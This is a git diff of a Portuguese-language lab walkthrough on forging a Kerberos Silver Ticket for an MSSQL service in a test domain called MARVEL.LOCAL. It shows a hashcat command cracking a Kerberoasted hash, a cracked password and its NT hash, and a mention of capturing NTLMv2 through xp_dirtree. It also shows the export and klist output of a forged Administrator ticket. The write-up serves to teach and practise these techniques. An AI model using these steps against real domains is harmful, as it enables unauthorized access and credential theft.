@@ -38,6 +38,8 @@ Para isso precisa:
 - Ele não contacta o DC pra validar se o ticket foi realmente emitido
 - Se você tem o hash do serviço, pode criar tickets que o serviço aceitará como legítimos
 
+### De momento sem privilegios
+<img width="1370" height="505" alt="DENEGADO-MSSQL" src="https://github.com/user-attachments/assets/cedf82c7-02e8-42e4-a4cc-6925124dc08f" />
 
 ### SID
 <img width="1679" height="94" alt="DomainSid" src="https://github.com/user-attachments/assets/49c267c5-30b6-4137-aff9-f35987ad4459" />
@@ -49,20 +51,33 @@ Com hashcat crackeamos o hash do usuario SQLService que no nosso exemplo e kerbe
 ```hashcat -a 0 -m 13100 mssql.hash /opt/SecLists/Passwords/rockyou.txt -O```
 ```$krb5tgs$23$*SQLService$MARVEL.LOCAL$MARVEL.local/SQLService*$ba2ef8e570680b9c43cc99c......:Goku123!```
 
+Ou pudemos enviar o NTLMv2 mediante autenticacion por xp_dirtree e crackear o ntlm se puder
+<img width="1371" height="166" alt="dt1" src="https://github.com/user-attachments/assets/e86e17e8-4db1-4c66-ab3f-4e78660f5392" />
+<img width="1100" height="226" alt="dt2hash" src="https://github.com/user-attachments/assets/3a658338-0b6c-43c3-bb39-dbe28630e401" />
+
+
 ### Hasheamos a senha
 [NT HASHER](https://www.browserling.com/tools/ntlm-hash)
 ```E4933A6CCF60591C5C1AC40C6A3DB382```
 
 ### Criacao do ticket com os dados que recoletamos
-<img width="1722" height="357" alt="silver-ticket-generated" src="https://github.com/user-attachments/assets/bb8fc0f7-70c0-4da8-bc69-6ffb73c906b1" />
+<img width="1866" height="364" alt="ticketadmin" src="https://github.com/user-attachments/assets/8cb6b62d-2657-441a-9e41-a8d01ed567d1" />
 
 ### Exportar o ticket para o ambiente e verificamos que esteja forjado
-<img width="944" height="185" alt="ccache-file" src="https://github.com/user-attachments/assets/f0d410aa-3a12-413b-992e-9342181cad5d" />
+```export KRB5CCNAME=Administrator.ccache```
+```
+klist
+Ticket cache: FILE:Administrator.ccache
+Default principal: Administrator@MARVEL.LOCAL
 
+Valid starting       Expires              Service principal
+02/19/2026 04:34:18  02/17/2036 04:34:18  MSSQLSvc/HYDRA-DC.MARVEL.local:60111@MARVEL.LOCAL
+	renew until 02/17/2036 04:34:18
+
+```
 
 Como temos salvo o ticket no Administrator.ccache nao precisamos colocal a pass para autenticarnos no servicio
-```python3 /opt/impacket-0-13-0/examples/mssqlclient.py  -k -no-pass MARVEL.local -windows-auth -p 60111```
-
+<img width="1467" height="494" alt="auth" src="https://github.com/user-attachments/assets/87da5b07-a90e-4b50-8b0d-d05e9740d7d4" />
 
 
 
